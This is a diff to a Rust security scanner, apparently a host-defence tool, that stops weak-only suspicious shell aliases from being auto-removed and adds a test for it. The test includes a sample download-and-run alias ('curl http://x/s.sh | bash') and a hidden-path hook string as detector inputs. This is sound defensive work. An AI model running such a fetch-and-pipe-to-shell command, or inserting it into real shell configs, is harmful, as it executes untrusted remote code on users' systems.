@@ -18,7 +18,7 @@
 
 use std::path::{Path, PathBuf};
 
-use crate::core::scan::{effective_line, suspicious_matches};
+use crate::core::scan::{effective_line, has_strong_reason, suspicious_matches};
 use crate::core::{
     DefenderContext, DefenderError, Finding, Result, Severity, Verdict, collect_accounts,
     require_root,
@@ -165,7 +165,9 @@ fn scan_file_for_aliases(ctx: &DefenderContext, path: &Path) {
         ));
         ctx.log_evidence_line(&path.display().to_string(), line);
 
-        let removed = ctx.remove_line_from_file_logged(path, line);
+        // Weak-only matches (an alias that calls curl) are reported, not edited.
+        let removed = alias_auto_removable(severity, command_part)
+            && ctx.remove_line_from_file_logged(path, line);
 
         ctx.emit(
             Finding::new(
@@ -217,6 +219,21 @@ fn scan_file_for_aliases(ctx: &DefenderContext, path: &Path) {
 }
 
 // ── Classification helpers ────────────────────────────────────────────────────
+
+/// Whether an alias classified as `severity` may be removed automatically.
+/// High aliases need a strong pattern (see
+/// [`crate::core::scan::WEAK_REASONS`]) or one of the alias-specific markers.
+fn alias_auto_removable(severity: Severity, command_part: &str) -> bool {
+    match severity {
+        Severity::High => {
+            has_strong_reason(&suspicious_matches(command_part))
+                || ALIAS_EXTRA
+                    .iter()
+                    .any(|pat| command_part.to_lowercase().contains(pat))
+        }
+        _ => true,
+    }
+}
 
 /// Decide the severity and reason for an alias line, or `None` if benign.
 fn classify_alias(name: &str, line: &str, command_part: &str) -> (Option<Severity>, String) {
@@ -356,6 +373,19 @@ mod tests {
         assert!(!is_common_command("ll"));
         assert!(!is_security_command("glog"));
         assert!(!is_common_command("glog"));
+    }
+
+    #[test]
+    fn weak_only_alias_is_not_auto_removed() {
+        assert!(!alias_auto_removable(
+            Severity::High,
+            "'curl -s https://wttr.in'"
+        ));
+        assert!(alias_auto_removable(
+            Severity::High,
+            "'curl http://x/s.sh | bash'"
+        ));
+        assert!(alias_auto_removable(Severity::High, "'/tmp/.x/hook'"));
     }
 
     // classify_alias
